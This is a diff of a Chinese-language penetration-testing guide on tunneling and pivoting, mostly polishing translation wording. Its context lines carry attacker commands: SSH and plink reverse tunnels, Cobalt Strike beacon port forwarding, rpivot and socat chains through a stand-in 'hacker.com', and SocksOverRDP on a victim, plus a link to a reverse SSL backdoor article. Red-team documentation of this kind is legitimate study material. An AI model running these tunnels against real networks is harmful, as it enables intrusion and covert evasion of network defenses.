@@ -68,7 +68,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-您需要**在两个设备上具有 root 权限**（因为您将创建新的接口），并且 sshd 配置必须允许 root 登录：\
+您需要**在两个设备上具有root权限**（因为您将创建新的接口），并且sshd配置必须允许root登录：\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-您可以通过 **ssh** 将所有 **流量** 隧道到一个 **子网络** 通过一个主机。\
+您可以通过 **ssh** 将所有 **流量** 通过主机 **隧道** 到 **子网络**。\
 例如，转发所有发送到 10.10.10.0/24 的流量。
 ```bash
 pip install sshuttle
@@ -153,14 +153,14 @@ rportfwd stop [bind port]
 需要注意：
 
 - Beacon 的反向端口转发旨在 **将流量隧道传输到 Team Server，而不是在单个机器之间中继**。
-- 流量是 **在 Beacon 的 C2 流量中隧道传输**，包括 P2P 链接。
+- 流量在 **Beacon 的 C2 流量中隧道传输**，包括 P2P 链接。
 - **不需要管理员权限** 来在高端口上创建反向端口转发。
 
 ### rPort2Port 本地
 
 > [!WARNING]
-> 在这种情况下，**端口是在 beacon 主机上打开的**，而不是在 Team Server 上，**流量被发送到 Cobalt Strike 客户端**（而不是 Team Server），然后从那里发送到指定的 host:port。
-```
+> 在这种情况下，**端口在 beacon 主机上打开**，而不是在 Team Server 上，**流量发送到 Cobalt Strike 客户端**（而不是 Team Server），然后从那里发送到指定的 host:port。
+```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
 ```
@@ -246,7 +246,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-通过 **NTLM 代理** 进行枢轴
+通过 **NTLM 代理** 进行枢转
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -290,9 +290,11 @@ victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
+[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
+
 ### SSL Socat Tunnel
 
-**/bin/sh console**
+**/bin/sh 控制台**
 
 在客户端和服务器两侧创建证书：
 ```bash
@@ -320,7 +322,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 它就像一个控制台版本的 PuTTY（选项与 ssh 客户端非常相似）。
 
-由于这个二进制文件将在受害者的机器上执行，并且它是一个 ssh 客户端，我们需要打开我们的 ssh 服务和端口，以便能够建立反向连接。然后，将仅本地可访问的端口转发到我们机器上的一个端口：
+由于这个二进制文件将在受害者的机器上执行，并且它是一个 ssh 客户端，我们需要打开我们的 ssh 服务和端口，以便能够建立反向连接。然后，要将仅本地可访问的端口转发到我们机器上的一个端口：
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -341,24 +343,24 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-您需要拥有 **系统的 RDP 访问权限**。\
+您需要拥有**系统的 RDP 访问权限**。\
 下载：
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用 Windows 远程桌面服务功能中的 `Dynamic Virtual Channels` (`DVC`)。DVC 负责 **在 RDP 连接上隧道数据包**。
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用 Windows 远程桌面服务功能中的 `Dynamic Virtual Channels` (`DVC`)。DVC 负责**在 RDP 连接上隧道数据包**。
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
-在您的客户端计算机上加载 **`SocksOverRDP-Plugin.dll`**，如下所示：
+在您的客户端计算机上加载**`SocksOverRDP-Plugin.dll`**，如下所示：
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-现在我们可以通过 **RDP** 使用 **`mstsc.exe`** 连接到 **victim**，我们应该收到一个 **prompt**，提示 **SocksOverRDP plugin is enabled**，并且它将 **listen** 在 **127.0.0.1:1080**。
+现在我们可以通过 **RDP** 使用 **`mstsc.exe`** 连接到 **victim**，我们应该收到一个 **prompt**，提示 **SocksOverRDP 插件已启用**，并且它将 **listen** 在 **127.0.0.1:1080**。
 
 通过 **RDP** 连接，并在受害者机器上上传并执行 `SocksOverRDP-Server.exe` 二进制文件：
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-现在在你的机器（攻击者）上确认端口 1080 正在监听：
+现在，在你的机器（攻击者）上确认端口 1080 正在监听：
 ```
 netstat -antb | findstr 1080
 ```
@@ -366,9 +368,9 @@ netstat -antb | findstr 1080
 
 ## 代理 Windows GUI 应用程序
 
-您可以使用 [**Proxifier**](https://www.proxifier.com/) 使 Windows GUI 应用程序通过代理进行导航。\
+您可以使用 [**Proxifier**](https://www.proxifier.com/) 使 Windows GUI 应用程序通过代理导航。\
 在 **Profile -> Proxy Servers** 中添加 SOCKS 服务器的 IP 和端口。\
-在 **Profile -> Proxification Rules** 中添加要代理的程序名称和要代理的 IP 连接。
+在 **Profile -> Proxification Rules** 中添加要代理的程序名称和要代理的 IP 的连接。
 
 ## NTLM 代理绕过
 
@@ -390,7 +392,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-现在，如果你在受害者的**SSH**服务上设置监听端口为443。你可以通过攻击者的2222端口连接到它。\
+现在，如果你在受害者的机器上将**SSH**服务设置为监听443端口。你可以通过攻击者的2222端口连接到它。\
 你也可以使用连接到localhost:443的**meterpreter**，而攻击者在2222端口监听。
 
 ## YARP
@@ -477,7 +479,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-[**ngrok**](https://ngrok.com/) **是一个可以通过一条命令行将解决方案暴露到互联网的工具。**\
+[**ngrok**](https://ngrok.com/) **是一个可以通过一条命令将解决方案暴露到互联网的工具。**\
 _暴露的 URI 类似于:_ **UID.ngrok.io**
 
 ### 安装
@@ -492,7 +494,7 @@ chmod a+x ./ngrok
 ```
 ### 基本用法
 
-**文档:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/)。
+**文档:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
 _如果需要，也可以添加身份验证和 TLS。_
 
